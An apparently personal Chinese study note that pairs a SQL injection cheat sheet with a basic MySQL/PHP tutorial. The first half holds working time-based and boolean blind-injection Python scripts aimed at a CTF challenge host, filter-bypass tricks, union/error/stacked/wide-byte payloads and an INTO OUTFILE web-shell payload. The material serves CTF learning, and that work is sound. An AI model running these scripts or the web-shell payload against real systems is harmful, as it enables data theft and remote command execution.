重要的玩意儿注入一定要注释后面的，使用--时注意前后要空格，要不然滚去用# information_schema.tables是自带的数据库 其中有三个表，分别是： 1.schemata 其中只有一个字段 schemata_name 存放所有库的库名 2.tables 俩字段 tables_schema 存放所有库的库名 table_name 存放所有表名 3.column 三个字段，前两个同tables（完全一样，不用改名） column_name 存放所有的字段名 直接套用都是使用二分法来找 时间盲注import requestsimport time# 目标 URLurl = &#x27;http://challenge.ctf.rois.team:30181/&#x27;# 提取表名def extract_table_name(): result = &quot;&quot; table_index = 0 # 表的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_table = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造时间盲注 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT &#123;table_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; start_time = time.time() r = requests.post(url, data=payload) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt;= 3: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前表名 break current_table += chr(head) char_index += 1 if not current_table: # 无更多表时退出循环 break result += current_table + &quot;
&quot; table_index += 1 return result# 提取列名def extract_column_name(table_name): result = &quot;&quot; column_index = 0 # 列的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_column = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造时间盲注 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;&#123;table_name&#125;&#x27; LIMIT &#123;column_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; start_time = time.time() r = requests.post(url, data=payload) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt;= 3: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前列名 break current_column += chr(head) char_index += 1 if not current_column: # 无更多列时退出循环 break result += current_column + &quot;
&quot; column_index += 1 return result# 提取数据def extract_data(table_name, column_name): result = &quot;&quot; data_index = 0 # 数据的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_data = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造时间盲注 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; start_time = time.time() r = requests.post(url, data=payload) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time &gt;= 3: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前数据 break current_data += chr(head) char_index += 1 if not current_data: # 无更多数据时退出循环 break result += current_data + &quot;
&quot; data_index += 1 return result# 主函数if __name__ == &quot;__main__&quot;: # 提取表名 print(&quot;提取表名中...&quot;) tables = extract_table_name() print(&quot;获取到的表名：&quot;) print(tables) # 提取列名 table_name = input(&quot;请输入要提取列名的表名：&quot;) print(f&quot;提取表 &#123;table_name&#125; 的列名中...&quot;) columns = extract_column_name(table_name) print(&quot;获取到的列名：&quot;) print(columns) # 提取数据 column_name = input(&quot;请输入要提取数据的列名：&quot;) print(f&quot;提取表 &#123;table_name&#125; 中列 &#123;column_name&#125; 的数据中...&quot;) data = extract_data(table_name, column_name) print(&quot;获取到的数据：&quot;) print(data) 布尔盲注import requests# 目标 URLurl = &#x27;http://challenge.ctf.rois.team:30181/&#x27;# 提取表名def extract_table_name(): result = &quot;&quot; table_index = 0 # 表的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_table = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造注入 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT &#123;table_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, 0, 1) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; r = requests.post(url, data=payload) if &quot;用户名或密码错误&quot; in r.text: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前表名 break current_table += chr(head) char_index += 1 if not current_table: # 无更多表时退出循环 break result += current_table + &quot;
&quot; table_index += 1 return result# 提取列名def extract_column_name(table_name): result = &quot;&quot; column_index = 0 # 列的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_column = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造注入 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;&#123;table_name&#125;&#x27; LIMIT &#123;column_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, 0, 1) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; r = requests.post(url, data=payload) if &quot;用户名或密码错误&quot; in r.text: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前列名 break current_column += chr(head) char_index += 1 if not current_column: # 无更多列时退出循环 break result += current_column + &quot;
&quot; column_index += 1 return result# 提取数据def extract_data(table_name, column_name): result = &quot;&quot; data_index = 0 # 数据的索引，从 0 开始 while True: char_index = 1 # 字符的索引，从 1 开始 current_data = &quot;&quot; while True: head = 0 # ASCII 起始值 tail = 127 # ASCII 结束值 while head &lt; tail: mid = (head + tail) // 2 # 构造注入 payload payload = &#123; &#x27;username&#x27;: f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, 0, 1) -- &quot;, &#x27;password&#x27;: &#x27;random_password&#x27; # 密码字段可以随便填 &#125; r = requests.post(url, data=payload) if &quot;用户名或密码错误&quot; in r.text: head = mid + 1 else: tail = mid if head == 0: # 检测到 ASCII 0 时结束当前数据 break current_data += chr(head) char_index += 1 if not current_data: # 无更多数据时退出循环 break result += current_data + &quot;
&quot; data_index += 1 return result# 主函数if __name__ == &quot;__main__&quot;: # 提取表名 print(&quot;提取表名中...&quot;) tables = extract_table_name() print(&quot;获取到的表名：&quot;) print(tables) # 提取列名 table_name = input(&quot;请输入要提取列名的表名：&quot;) print(f&quot;提取表 &#123;table_name&#125; 的列名中...&quot;) columns = extract_column_name(table_name) print(&quot;获取到的列名：&quot;) print(columns) # 提取数据 column_name = input(&quot;请输入要提取数据的列名：&quot;) print(f&quot;提取表 &#123;table_name&#125; 中列 &#123;column_name&#125; 的数据中...&quot;) data = extract_data(table_name, column_name) print(&quot;获取到的数据：&quot;) print(data) 零.绕过方式 大小写绕过：比如过滤select时，在不区分大小写时候可以Select绕过 双写绕过：过滤关键字可以用selselctect来绕过 空格绕过： ○&#x2F;**&#x2F;可以代替空格当空格被过滤的时候 例如：select&#x2F;**&#x2F;user&#x2F;**&#x2F;from&#x2F;**&#x2F;users; ○可以使用Tab代替空格 ○可以使用空格url编码%20 ○如果空格被过滤，括号没有被过滤，可以用括号绕过 例如：select(user)from(users); &#x3D;被过滤：可以用like或rlike，也可以用regexp（正则来匹配）来绕过 比如&#x3D;’admin’就可以like’admin’ select被过滤：可以使用desc倒序查看表内的字段，也可以showcolumnsfrom表名。当需要查看具体信息的时候，可以使用预处理语句（堆叠注入查询） 编码绕过：两次URL全编码 一.联合注入格式&#x27; UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。 同时，每条select语句中的列的顺序必须是相同的。 有时返回的不是我们想要的数据，请记住返回值（要显示的那个！）在原查询的位置 在进行联合查询时，同位置的就会覆盖显示过去（尽管可能都不在一个表，不是一个名） 一些小部件1.order by除了关键字DESC,还可以： order by column_name/数字（对应第几列） 不存在（名字or列数）会报错 2.concat拼接字符串,格式： concat(str1，str2) 其中一个为null，就会直接返回null 3.group_concat格式： group_concat([distinct]要连接的字段[order by 排序字段 asc/desc][separator ‘分隔符’]) distinct 去重 分隔符默认是逗号 4.group by值得注意的是，MySQL实现这个是通过建立一个临时空表 5.substr格式：substr(string，start，length) 0是第一个位置，负数从结尾指定位置开始 length可选，默认是到结束位置 6.ascll格式：ascii(str) 返回字符串最左边字符的ascll 只返回一个 7.database()当前使用的数据库，相当于使用该库名 流程1.判断注入点 用’等尝试破环查询语句，看看回显（整型不用闭合） &#x2F;&#x2F;整型都不用引号，字符型要注意闭合 2.摸个表！ 用上面的order by 数字，看看到多少会报错（回显异常） 以及摸一摸回显的在第几个位置（实在不行直接1，2，3看回来哪个） 3.开查！ &gt;&gt;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名称&#x27;&gt;//查表名&gt;&gt;id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;表名称&#x27;&gt;//查字段名（列名）&gt;&gt;id=1 union select 1,2,字段名 from 表名&gt;//查详细信息 二.报错注入前提是会回显错误，可以乱写SQL试一试有没有显示报错 1.updatexml()模板 select * from major where id&#x3D;1 and updatexml(1,concat(0x26,(select database()),0x26),3) 语法updatexml（xml_documat，XPath_string，new_value） xml_documat：string，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。 XPath_string：XPath（一种字符串格式），报错注入时需要写入错误的格式来显示错误的信息。 new_value：string，替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;） 原理用0x26开头，显然不是XPath格式，这是报错。 XPath格式出错会返回其内容，因此用concat把我们要的东西连在0x26后 2.extractvalue()模板 select * from major where id&#x3D;1 and extractvalue(1,concat(0x26,(selectdatabase()),0x26) 语法extractvalue（xml_documat，XPath_string） 原理同上 三.布尔盲注流程1.查数据库id=1 and (length(database())&gt;3 -- 查长度 id=1 and (ascii(substr(database(),1,1))&gt;110 -- 查具体字符 2.查表1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0 -- 查表数，加limit子句分页输出，改变起始位置，长度不变，直到报错（不存在当然无法比较）1 and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit0,1),1,1))=110-- 查表名 3.查字段假设查出的表名是flag 1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1-- 查列数1 and ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot; [and ordinal_position = 1]),1,1))=102-- 查列名，同样通过改start参数来换位置,改ordinal_position来查询其他列 4.查数据假设查出来的列名也是flag 1 and(select count(flag) from flag)=1-- 查有多少个字段信息（多少非空行）1 and ascii(substr((select flag from flag limit 0,1),32,1))-- 查字段信息有多长，改substr的start来判断长度，改limit的start来换行1 and ascii(substr((select flag from flag limit0,1),1,1))=99-- 查具体字段信息 很显然，你并不必要查名字或者字段信息的长度，因为不存在也无法比较 对于字符信息，也可以用ascii值为0来当作结束条件。 判断r = requests.post(url, data=payload)if &quot;用户名或密码错误&quot; in r.text: head = mid + 1else: tail = mid 四.时间盲注和布尔盲注类似，但是不依赖固定的返回值 两者只有判断条件的不同 IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0)#对于布尔盲注，要把sleep(3)改为1，来返回真，此后判断返回值是否含有错误时的内容来判断 时间盲注是： start_time = time.time()r = requests.post(url, data=payload)end_time = time.time()elapsed_time = end_time - start_timeif elapsed_time &gt;= 3: head = mid + 1else: tail = mid 五.堆叠查询注入模板1&#x27;;select * from major;# 流程（select被过滤）show databases show tables desc `表名` 或者 show columns from `表名` sEt @a&#x3D;concat(“sel”,”ect 列名 from `表名`“);PRepare hello from @a;execute hello ——-多次堆叠和预处理语句 原理SQL语句可以堆叠，多语句分号隔开，这也导致你其实可以直接修改数据库…… 加上盲注的几个，就可以窃取+修改（可刑可拷） EX.预处理语句一种特殊的SQL处理方式；预处理不会直接执行SQL语句，而是先将SQL语句编译，生成执行计划，然后通过Execute命令携带SQL参数来执行SQL语句 模板： @a prepare xxx as select * from user where id=1; -- 将select查询语句(@a)定义为xxx 然后就execute xxx -- 执行@a语句，为了避免过滤，上面使用concat来组成select可以用set来对@a参数赋值（可见concat的返回值就是结果） 六.二次注入用于注册加登录加可以改密的页面，所以叫二次 注册时加点特殊字符 比如用户名&amp;密码设为： ‘admin123”\ 如果登录后改密会报错，说明可以二次注入 然后： 只要在用户名处用报错注入 修改密码的时候就会触发（密码都是随便填，但要记住，登录要用） 七.cookie注入本质上只是注入点不同 一种变体，只有参数用cookie传递的时候才能用 比如: &lt;?php$user_id = $_COOKIE[&#x27;user_id&#x27;];$sql = &quot;SELECT * FROM users WHERE user_id = &#x27;$user_id&#x27;&quot;;$result = mysqli_query($conn, $sql);?&gt; 然后就抓包，直接去cookie里找user_id，使用其他注入方式 类似的，请求头的各个位置都有可能可以注入 八.outfile_sql注入MySQL如果没有写入权限，想都不要想这玩意儿 这是一个关键字，基本语法 SELECT ... INTO OUTFILE 于是可以： 1;SELECT &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;; -- 这样，如果我们执行了这个php文件（所以你写的必须放在这个网站的根目录，通常是&#x2F;var&#x2F;www&#x2F;html&#x2F;），就可以使用 http://example.com/shell.php?cmd=ls 来执行系统命令。 万一不知道路径？ 可以先联合注入： &#x27;union select 1,@@basedir,@@datadir # @@basedir 系统变量，是MySQL的安装路径 @@datadir 系统变量，是MySQL的文件路径 （都是绝对路径） EX.配置环境 在MYSQL安装目录下的my.ini，增加一个：secure-file-priv&#x3D;”” 重启生效 可以用sql命令： show variables like “secure_file_priv”或show variables like “secure_file_priv” 来查看当前设置，NULL表示禁止导入导出，空表示不限制， 若值为&#x2F;tmp&#x2F;，表示限制mysqld的导入、导出只能发生在&#x2F;tmp&#x2F;目录 九.宽字节注入仅限数据库时GBK编码和后端进行\转义 此时闭合用的%27（单引号）改成%df%27（GBK编码下是个汉字） 因为汉字双字节，所以PHP转义的\会被吃掉 然后联合查询 注意：由于’被转义 table_schema&#x3D;’库名’ 要改为嵌套查询 table_schema&#x3D;(select database()) 例如： id=20%df%27union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(selectdatabase())%23-- 查列 id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema=(selectdatabase()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1%23 这里就使用了三层嵌套，第一层是table_schema，它代表库名的嵌套，第二层和第三层是table_name的嵌套，这里可以看到语句中有两个limit，前一个limit控制表名的顺序，后一个则控制字段名的顺序。这里就可以查询到表中的字段信息，剩下的就是查询详细信息，这里就不做介绍 在PHP中，通过iconv()进行编码转换时，也可能存在宽字符注入漏洞

MySQL基本术语列：具有相同数据类型的数据的集合 行：每一行用来描述某条记录的具体信息 冗余：存储两倍数据。冗余降低了性能，但提高了数据的安全性 主键：主键是唯一的，一个数据表只能由一个主键。可以用主键查询信息 外键： 一个表中的一列或多列，这些列的值必须与另一个表（通常称为主表）中的主键或唯一键的值相匹配，或者为空值。包含外键的表称为从表（或子表），被引用的表称为主表（或父表）。 复合键：复合键（组合键）将多个列组成一个索引键，一般用于复合索引 索引：使用索引可快速访问数据表中的特定信息，索引是数据库中由一列或多列的值进行排序的结构。相当于书籍的目录。 参照完整性：参照的完整性要求关系中不允许引入不存在的实体。 值：行的具体信息，每个值必须与该列的数据类型相同 键：键的值在当前列中具有唯一性 管理Windows: 启动&#x2F;关闭 去找 services.msc 或者使用命令net start&#x2F;stop mysql Linux: 启动&#x2F;关闭sudo systemctl start/stop mysql 在一些老旧的版本： sudo service mysql start/stop 重启sudo systemctl restart mysql 或者 sudo service mysql restart 检查状态sudo systemctl status mysql 或者 sudo service mysql status 用户设置创建CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;; username：用户名。 host：指定用户可以从哪些主机连接。例如，localhost 仅允许本地连接，% 允许从任何主机连接。 password：用户的密码。 例如： CREATE USER &#x27;john&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password123&#x27;; 删除DROP USER &#x27;username&#x27;@&#x27;host&#x27;; 修改密码ALTER USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;new_password&#x27;; 修改用户主机-- 删除旧用户DROP USER &#x27;john&#x27;@&#x27;localhost&#x27;;-- 重新创建用户并指定新的主机CREATE USER &#x27;john&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password123&#x27;; 授权GRANT privileges ON database_name.* TO &#x27;username&#x27;@&#x27;host&#x27;; privileges：所需的权限，如 ALL PRIVILEGES、SELECT、INSERT、UPDATE、DELETE 等。 database_name.*：表示对某个数据库或表授予权限。database_name.* 表示对整个数据库的所有表授予权限，database_name.table_name 表示对指定的表授予权限。 TO &#39;username&#39;@&#39;host&#39;：指定授予权限的用户和主机。 例如： GRANT ALL PRIVILEGES ON test_db.* TO &#x27;john&#x27;@&#x27;localhost&#x27;; 授权或者撤权都要刷新才能生效：FLUSH PRIVILEGES; 查权SHOW GRANTS FOR &#x27;username&#x27;@&#x27;host&#x27;; 撤权REVOKE ALL PRIVILEGES ON test_db.* FROM &#x27;john&#x27;@&#x27;localhost&#x27;; 创建并指定权限CREATE USER &#x27;john&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password123&#x27; WITH GRANT OPTION; //加上这句GRANT ALL PRIVILEGES ON test_db.* TO &#x27;john&#x27;@&#x27;localhost&#x27;; &#x2F;etc&#x2F;my.cnf 文件配置 管理命令1.use 数据库名 ​ 使用该命令后所有Mysql命令都只针对该数据库 2.SHOW DATABASES ​ 显示所有数据库列表 3.SHOW TABLES ​ 显示某数据库的所有表（所以要先use） 4.SHOW COLUMNS FROM 数据表 ​ 显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其 他信息 5.SHOW INDEX FROM 数据表 ​ 显示索引，包括主键 6.SHOW TABLE STATUS [FROM db_name] [LIKE ‘pattern’] \G ​ 该命令将输出Mysql数据库管理系统的性能及统计信息。 例如： SHOW TABLE STATUS FROM 数据库名;SHOW TABLE STATUS from RUNOOB LIKE &#x27;runoob%&#x27;; #显示以runoob%开头的表的信息SHOW TABLE STATUS from RUNOOB LIKE &#x27;runoob%&#x27;\G;#\G，查询结果按列打印 PHP语法1.连接&lt;?php$servername = &quot;localhost&quot;;$username = &quot;your_username&quot;;$password = &quot;your_password&quot;;$database = &quot;your_database&quot;; // 创建连接$conn = mysqli_connect($servername, $username, $password, $database); // 检测连接，可见mysqli_connect是有返回值的if (!$conn) &#123; die(&quot;连接失败: &quot; . mysqli_connect_error());&#125; echo &quot;连接成功&quot;;?&gt; 其中的函数格式和部分功能： 函数定义：mysqli_function(value,value,...); mysqli_connect($connect);mysqli_query($connect,&quot;SQL 语句&quot;);mysqli_fetch_array()mysqli_close()//都是内置的函数 二进制连接mysql -u your_username -p//-u 指定用户名，-p 要输入密码 使用脚本连接mysqli_connect(host, username, password, dbname,port, socket); //都是可选参数，没有就不写。其中只有port是int，其他都是字符串/*套接字（socket）是一种进程间通信机制。当脚本就在服务器上时，使用这个不用经过网络套接字（通过 TCP/IP 协议），而是使用UNIX套接字（所以在windows系统上，这个参数会被忽略）。*/其实就是不用网络，在本机进程间通信连接注意：这是个指向.socket文件的路径所以，如果用这玩意儿，就不用指定port了，可以直接设置为null 在PHP8.0以上，可以使用命名参数来保证正确传参，参数名就是上面那几个 mysqli_close() 函数来断开与 MySQL 数据库的链接。 函数定义：bool mysqli_close ( mysqli $link ) 该函数只有一个参数为 mysqli_connect() 函数创建连接成功后返回的 MySQL 连接标识符（mysqli_connect的返回值）。 例如： $link = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);if (!$link) &#123; die(&quot;连接失败: &quot;. mysqli_connect_error());&#125;// 执行一些数据库操作// 显式关闭连接mysqli_close($link);//不给参数，就关闭最近打开的一个 2.退出EXIT;或者QUIT;或者快捷键ctrl +D 操作数据库0.查看已有数据库SHOW DATABASES; 1.创建CREATE DATABASE [IF NOT EXISTS] 数据库名;如果要指定选项，可以加上其他参数：CREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;指定字符集和排列顺序。如果不加IF NOT EXISTS并且存在该数据库，会报错 使用 mysqladmin注：mysqladmin是个命令 mysqladmin -u your_username -p create your_database如果要指定选项，可以加上特定参数：mysqladmin -u your_username -p create your_database \ --default-character-set=utf8mb4 \ --default-collation=utf8mb4_general_ci作用同上 如果是普通用户，可能要特定权限 这个命令行可以使用SQL的命令： mysqladmin -u your_username -p your_command例如：mysqladmin -u your_username -p status 使用PHP脚本mysqli_query(connection,query,resultmode);也有返回值,也是用于判断是否成功 除了最后一个，都是必须项。 connection：就是$connt，也就是mysqli_connet(…) query：查询字符串，也就是SQL语句。 resultmode：这是常量，只能填以下两个之一： ​ MYSQLI_USE_RESULT （检索大量数据时用） ​ MYSQLI_STORE_RESULT （默认） 2.删除DROP DATABASE [IF EXISTS] &lt;database_name&gt;;同样，如果不加IF EXISTS，删除不存在的，会报错 &#x2F;&#x2F;这是不可逆的 使用 mysqladminmysqladmin -u your_username -p drop your_database 使用PHP脚本还是用： mysqli_query(connection,query,resultmode); 显而易见： 此时的$query就是DROP DATABASE [IF EXISTS] ; 3.选择使用命令行mysql -u root -p; //执行完这个，就会进入mysql提示符use &lt;database name&gt;;....; //其他操作命令 use语句可以换成命令中的-D参数，变成： mysql -u your_username -p -D your_database 使用php脚本mysqli_select_db(connection,dbname);//都是必填项 一个实例&lt;?php$dbhost = &#x27;localhost&#x27;; // mysql服务器主机地址$dbuser = &#x27;root&#x27;; // mysql用户名$dbpass = &#x27;123456&#x27;; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn )&#123; die(&#x27;连接失败: &#x27; . mysqli_error($conn));&#125;echo &#x27;连接成功&#x27;;mysqli_select_db($conn, &#x27;RUNOOB&#x27; );mysqli_close($conn);?&gt; 数据类型数值类型几个不太一样的地方： int分为：tinyint（1Bytes）,smallint（2）,mediumint（3）,int（4）,bigint（8） 多了一个 DECIMAL类型，用于表示小数： 对于DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2 日期和时间类型 DATE （3）：YYYY-MM-DD TIME（3）：HH:MM:SS YEAR（1）：YYYY DATATIME（8）：YYYY-MM-DD hh:mm:ss TIMESTAMP（4）：同上 &#x2F;&#x2F;这就是时间戳 字符串类型 类型 大小 用途 CHAR 0-255 bytes 定长字符串 VARCHAR 0-65535 bytes 变长字符串 TINYBLOB 0-255 bytes 不超过 255 个字符的二进制字符串 TINYTEXT 0-255 bytes 短文本字符串 BLOB 0-65 535 bytes 二进制形式的长文本数据 TEXT 0-65 535 bytes 长文本数据 MEDIUMBLOB 0-16 777 215 bytes 二进制形式的中等长度文本数据 MEDIUMTEXT 0-16 777 215 bytes 中等长度文本数据 LONGBLOB 0-4 294 967 295 bytes 二进制形式的极大文本数据 LONGTEXT 0-4 294 967 295 bytes 极大文本数据 others枚举与集合类型 ENUM: 枚举类型，用于存储单一值，可以选择一个预定义的集合。 SET: 集合类型，用于存储多个值，可以选择多个预定义的集合。 空间数据类型GEOMETRY, POINT, LINESTRING, POLYGON, MULTIPOINT, MULTILINESTRING, MULTIPOLYGON, GEOMETRYCOLLECTION: 用于存储空间数据（地理信息、几何图形等）。 使用数据库0.查看已有数据表&#x2F;列SHOW TABLES; SHOW TABLE STATUS; //这是看表类型（ENGING等）SHOW COLUMNS FROM table_name; //这是看表结构，不是数据 不加S的话，要写具体名称或者模糊匹配。\G以竖排显示 1.创建数据表必须提供： 表名 表字段名 定义每个表字段的数据类型 SQL语法： CREATE TABLE table_name ( column1 datatype, column2 datatype, ...);//column是列名 可以加子句： CREATE TABLE mytable ( id INT PRIMARY KEY, name VARCHAR(50)) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; SQL实例CREATE TABLE users ( id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) NOT NULL, email VARCHAR(100) NOT NULL, birthdate DATE, is_active BOOLEAN DEFAULT TRUE);//AUTO_INCREMENT PRIMARY KEY,设定该列自增长(1,2,3...)，且是主键（这两者一般同时出现）注意：每个表只能有一个 AUTO_INCREMENT 列，必须为整数类型 即使删除了表中最大自增值的记录，下一次插入新记录时，自增值仍然会继续 递增，不会复用已删除的自增值。 起始值默认为1，但可以用`ALTER TABLE users AUTO_INCREMENT = 100;`改//NOT NULL，这项必填//DEFAULT TRUE，设定默认值为TRUE以上三行都是附加的属性 通过命令行mysql -u root -p -D &lt;database name&gt;//接下来进了SQL命令行，当然就是写SQL语句。 注意：mySQL命令行中，回车不是结束，;才是。 因此，写不下时可以随意换行 通过PHP脚本还是 mysqli_query(connection,query,resultmode); 2.删除数据表[数据]DROP TABLE [IF EXISTS] table_name; //这是直接删表TRUNCATE TABLE table_name; //这是删表数据（保留结构，数据全删）DELETE FROM table_name WHERE condition; //这也是删表数据（保留结构，加条件可不全删）注意：TURUNCATE是直接释放数据页的空间，没有详细的删除的日志，因此不能触发任何触发器，也不能事务回滚但是更加高效，delete是逐行删除，会触发，能回滚，但更低效 使用命令行和PHP脚本，同上 3.插入表数据INSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...); &#x2F;&#x2F;value若是字符型，要写成&#39;value&#39; &#x2F;&#x2F;如果插入所有列，可以省略列名。此时第一个要写NULL,因为它是那个自增长列的占位符。当然也可以第一行写0（接下来同理），要不然会变来变去。 插入多行实例： INSERT INTO users (username, email, birthdate, is_active)VALUES (&#x27;test1&#x27;, &#x27;test1@runoob.com&#x27;, &#x27;1985-07-10&#x27;, true), (&#x27;test2&#x27;, &#x27;test2@runoob.com&#x27;, &#x27;1988-11-25&#x27;, false), (&#x27;test3&#x27;, &#x27;test3@runoob.com&#x27;, &#x27;1993-05-03&#x27;, true); 使用命令行和PHP脚本，同上，这之后的也都是同上 但是，如果插入的数据中有中文，必须先执行 mysqli_query($conn , &quot;set names utf8&quot;);或者使用PHP函数mysqli_set_charset($conn, &quot;utf8&quot;); //它会同时设置：character_set_client：客户端发送数据时使用的字符编码。character_set_results：服务器返回结果集时使用的字符编码。character_set_connection：连接层使用的字符编码。 获取自增的值$last_id=mysqli_insert_id($conn) 4.修改表数据 进行重要的结构修改时，建议先备份数据 UPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition; //where子句可选，没有就会更新所有行 替换某个字段中的某个字符 当我们需要将字段中的特定字符串批量修改为其他字符串时，可使用以下操作： UPDATE table_name SET field=REPLACE(field, &#x27;old-string&#x27;, &#x27;new-string&#x27;) [WHERE Clause]; 5.修改表名&#x2F;结构&#x2F;类型添加列&#x2F;主键ALTER TABLE table_nameADD COLUMN new_column_name datatype;以及ALTER TABLE table_nameADD PRIMARY KEY (column_name);以及ALTER TABLE testalter_tbl ENGINE = MYISAM; 添加外键ALTER TABLE child_tableADD CONSTRAINT fk_nameFOREIGN KEY (column_name) REFERENCES parent_table (column_name); 修改数据类型ALTER TABLE TABLE_NAMEMODIFY COLUMN column_name new_datatype; 修改列&#x2F;表名ALTER TABLE table_nameCHANGE COLUMN old_column_name new_column_name datatype;-- 可以顺手改数据类型以及ALTER TABLE old_table_nameRENAME TO new_table_name; 删除列ALTER TABLE table_nameDROP COLUMN column_name; 修改字段类型及名称可以使用上面的CHANGE子句 也可以用MODIFY子句 ALTER TABLE testalter_tbl MODIFY c CHAR(10);等同于ALTER TABLE testalter_tbl CHANGE c c CHAR(10);只不过MODIFY子句不能顺便改名 这两者修改时都可以附带上NOT NULL，DEFAULT等 例如： ALTER TABLE testalter_tbl MODIFY j BIGINT NOT NULL DEFAULT 100; 修改&#x2F;删除默认值等ALTER TABLE testalter_tbl ALTER i SET DEFAULT 1000;以及ALTER TABLE testalter_tbl ALTER i DROP DEFAULT/PRIMARY KEY; 6.读取&#x2F;查询表数据读取select * from 数据表名; //可以多表`,`分开 查询SELECT column1, column2, ...FROM table_name //可以多表`,`分开[WHERE condition][ORDER BY column_name [ASC | DESC]][LIMIT N][offset M]; 使用 * 表示选择所有列。 WHERE condition 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。 ORDER BY column_name [ASC | DESC] 可选子句，指定结果集的排序顺序，默认升序（ASC）。 LIMIT N 可选子句，返回N条记录 offset N 可选子句，跳过M条记录 limit M offset N; 相当于 limit N,M; 获取数据1.使用 mysqli_fetch_array MYSQLI_ASSOC按行获取,一次只从返回的数据中获取一行 MYSQLI_ASSOC是返回关联数组 也可以用 MYSQLI_NUM 